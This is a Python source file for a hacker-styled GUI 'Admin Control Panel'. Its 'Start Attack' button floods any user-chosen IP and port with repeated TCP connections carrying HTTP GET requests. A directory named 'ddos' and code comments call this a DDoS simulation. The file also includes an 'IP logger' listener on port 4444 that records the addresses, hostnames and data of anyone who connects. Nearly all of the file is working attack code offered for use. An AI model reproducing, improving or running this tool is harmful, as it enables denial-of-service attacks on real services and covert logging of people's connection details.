import socket
import time
import threading
import tkinter as tk
from tkinter import messagebox
from colorama import Fore, init
import os

# Initialize Colorama (although we won't use it in the GUI itself, we can for logs)
init(autoreset=True)

# Global variables to store the target IP from the user input and the logging status
target_ip = None
logging_active = False  # Variable to track if logging is active
server_socket = None  # Global variable to hold the server socket

# Full path for the LOGS directory
LOGS_DIR = r"C:\ddos\attack 2 - Copy\LOGS"

# Ensure the LOGS directory exists
if not os.path.exists(LOGS_DIR):
    try:
        os.makedirs(LOGS_DIR)
    except PermissionError as e:
        print(f"[!] Error: Permission denied while creating directory {LOGS_DIR}. Please check folder permissions.")
        exit()

# Function to send traffic (DDoS simulation)
def send_traffic(target_ip, target_port, num_requests, delay, log_widget):
    try:
        # Ensure num_requests and delay are of the correct types
        num_requests = int(num_requests)
        delay = float(delay)
    except ValueError as e:
        log_widget.insert(tk.END, f"[!] Error: Invalid number or delay format.\n")
        log_widget.yview(tk.END)
        return
    
    log_widget.insert(tk.END, f"\n[+] Sending traffic to {target_ip}:{target_port}...\n")
    log_widget.yview(tk.END)

    for i in range(num_requests):
        try:
            # Create a new socket for each request
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(5)  # Increased timeout to 5 seconds

            # Connect to the target IP and port
            client_socket.connect((target_ip, target_port))

            # Send a basic dummy HTTP GET request
            message = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n"
            client_socket.send(message.encode())

            log_widget.insert(tk.END, f"[+] Sent request {i + 1} to {target_ip}:{target_port} - GET /\n")
            log_widget.yview(tk.END)

            try:
                # Try to receive response with timeout
                response = client_socket.recv(1024).decode()
                log_widget.insert(tk.END, f"[+] Response received for request {i + 1}\n")
            except socket.timeout:
                log_widget.insert(tk.END, f"[*] Response timeout for request {i + 1} (normal behavior)\n")
            except Exception as e:
                log_widget.insert(tk.END, f"[*] Could not receive response for request {i + 1}: {str(e)}\n")

            client_socket.close()
            time.sleep(delay)

        except ConnectionRefusedError:
            log_widget.insert(tk.END, f"[!] Connection refused for request {i + 1}\n")
            log_widget.yview(tk.END)
        except socket.timeout:
            log_widget.insert(tk.END, f"[!] Connection timeout for request {i + 1}\n")
            log_widget.yview(tk.END)
        except Exception as e:
            log_widget.insert(tk.END, f"[!] Error sending request {i + 1}: {str(e)}\n")
            log_widget.yview(tk.END)

    log_widget.insert(tk.END, f"[+] Finished sending {num_requests} requests to {target_ip}:{target_port}.\n")
    log_widget.yview(tk.END)

# Function to log IP and port (simulate receiving IPs)
def log_ip(log_widget):
    global logging_active, server_socket
    if logging_active:
        log_widget.insert(tk.END, "[!] Logging is already active. Please stop logging first.\n")
        log_widget.yview(tk.END)
        return

    logging_active = True
    try:
        # Set up a socket server to simulate IP logging
        HOST = "127.0.0.1"
        PORT = 4444

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Reuse address option to avoid error
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        log_widget.insert(tk.END, f"\n[+] Listening for incoming connections on {HOST}:{PORT}...\n")
        log_widget.yview(tk.END)

        while logging_active:
            try:
                client, addr = server_socket.accept()
                log_widget.insert(tk.END, f"[+] Connection Established: {addr[0]}:{addr[1]}\n")
                log_widget.yview(tk.END)

                # Get the hostname of the client
                try:
                    hostname = socket.gethostbyaddr(addr[0])[0]
                except socket.herror:
                    hostname = "Unknown"

                log_widget.insert(tk.END, f"[+] Hostname: {hostname}\n")
                log_widget.yview(tk.END)

                # Simulate receiving data (IP and port logging)
                data = client.recv(1024).decode()
                if data:
                    log_widget.insert(tk.END, f"[+] IP logged: {addr[0]}:{addr[1]}\n")
                    log_widget.insert(tk.END, f"[+] Data received: {data.strip()}\n")
                    log_widget.yview(tk.END)

                    # Write the logged IP, hostname, and data to a text file in the LOGS directory
                    log_file_path = os.path.join(LOGS_DIR, "ip_log.txt")
                    try:
                        with open(log_file_path, "a") as log_file:
                            log_file.write(f"[+] IP logged: {addr[0]}:{addr[1]}\n")
                            log_file.write(f"[+] Hostname: {hostname}\n")
                            log_file.write(f"[+] Data received: {data.strip()}\n\n")
                    except PermissionError as e:
                        log_widget.insert(tk.END, f"[!] Error: Permission denied while writing to {log_file_path}. {str(e)}\n")
                        log_widget.yview(tk.END)
                else:
                    log_widget.insert(tk.END, "[!] No data received.\n")
                    log_widget.yview(tk.END)
                client.close()
            except Exception as e:
                if logging_active:
                    log_widget.insert(tk.END, f"[!] Error accepting connection: {str(e)}\n")
                    log_widget.yview(tk.END)
    except Exception as e:
        if logging_active:
            log_widget.insert(tk.END, f"[!] Error in log_ip: {str(e)}\n")
            log_widget.yview(tk.END)

# Function to stop the IP logger
def stop_logging(log_widget):
    global logging_active, server_socket
    if not logging_active:
        log_widget.insert(tk.END, "[!] Logging is not active.\n")
        log_widget.yview(tk.END)
        return

    logging_active = False
    try:
        if server_socket:
            server_socket.close()  # Close the socket
            log_widget.insert(tk.END, "[+] Logging stopped and socket closed.\n")
            log_widget.yview(tk.END)
    except Exception as e:
        log_widget.insert(tk.END, f"[!] Error while stopping logging: {str(e)}\n")
        log_widget.yview(tk.END)

# Function to start/stop logging
def toggle_logging(log_widget):
    if logging_active:
        stop_logging(log_widget)
    else:
        threading.Thread(target=log_ip, args=(log_widget,)).start()

# Function to handle the attack
def start_attack(log_widget):
    global target_ip
    try:
        # Get IP from the entry if it's provided by the user, otherwise use the logged IP
        target_ip = entry_target_ip.get() if entry_target_ip.get() else target_ip

        if not target_ip:
            messagebox.showerror("Error", "Please provide a Target IP.")
            return

        # Convert target_port to integer and add validation
        try:
            target_port = int(entry_target_port.get())
            if target_port < 1 or target_port > 65535:
                messagebox.showerror("Error", "Port must be between 1 and 65535.")
                return
        except ValueError:
            messagebox.showerror("Error", "Port must be a valid number.")
            return

        num_requests = int(entry_num_requests.get())
        delay = float(entry_delay.get())

        # Start a new thread for sending traffic without blocking the GUI
        attack_thread = threading.Thread(target=send_traffic, args=(target_ip, target_port, num_requests, delay, log_widget))
        attack_thread.start()

    except Exception as e:
        log_widget.insert(tk.END, f"[!] Error in start_attack: {str(e)}\n")
        log_widget.yview(tk.END)

# Create the GUI window
root = tk.Tk()
root.title("Admin Control Panel")

# Set the window size and center it
window_width = 800  # Increased width for a bigger terminal-like window
window_height = 600  # Increased height for more log space
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
position_top = int(screen_height / 2 - window_height / 2)
position_left = int(screen_width / 2 - window_width / 2)
root.geometry(f"{window_width}x{window_height}+{position_left}+{position_top}")

# Set dark theme for the background
root.config(bg="black")

# Create the labels and input fields for sending traffic with unreadable text
label_target_ip = tk.Label(root, text="Target IP (Manual):", fg="light yellow", bg="black", font=("Courier", 12))
label_target_ip.pack(pady=5)
entry_target_ip = tk.Entry(root, width=40, bg="black", fg="white", font=("Courier", 12))
entry_target_ip.pack(pady=5)

label_target_port = tk.Label(root, text="Target Port:", fg="light yellow", bg="black", font=("Courier", 12))
label_target_port.pack(pady=5)
entry_target_port = tk.Entry(root, width=40, bg="black", fg="white", font=("Courier", 12))
entry_target_port.pack(pady=5)

label_num_requests = tk.Label(root, text="Number of Requests:", fg="light yellow", bg="black", font=("Courier", 12))
label_num_requests.pack(pady=5)
entry_num_requests = tk.Entry(root, width=40, bg="black", fg="white", font=("Courier", 12))
entry_num_requests.pack(pady=5)

label_delay = tk.Label(root, text="Delay between Requests (s):", fg="light yellow", bg="black", font=("Courier", 12))
label_delay.pack(pady=5)
entry_delay = tk.Entry(root, width=40, bg="black", fg="white", font=("Courier", 12))
entry_delay.pack(pady=5)

# Create the buttons side by side with hacker style buttons
frame_buttons = tk.Frame(root, bg="black")
frame_buttons.pack(pady=20)

button_log_ip = tk.Button(frame_buttons, text="Start/Stop IP Logger", command=lambda: toggle_logging(log_widget), fg="black", bg="light green", font=("Courier", 12), relief="solid")
button_log_ip.pack(side="left", padx=15)

button_start_attack = tk.Button(frame_buttons, text="Start Attack", command=lambda: start_attack(log_widget), fg="black", bg="red", font=("Courier", 12), relief="solid")
button_start_attack.pack(side="left", padx=15)

# Create a Text widget to show logs (increased size for terminal-like experience)
log_widget = tk.Text(root, width=100, height=20, bg="black", fg="white", font=("Courier", 10), wrap=tk.WORD)
log_widget.pack(pady=10)

# Start the GUI main loop
root.mainloop()
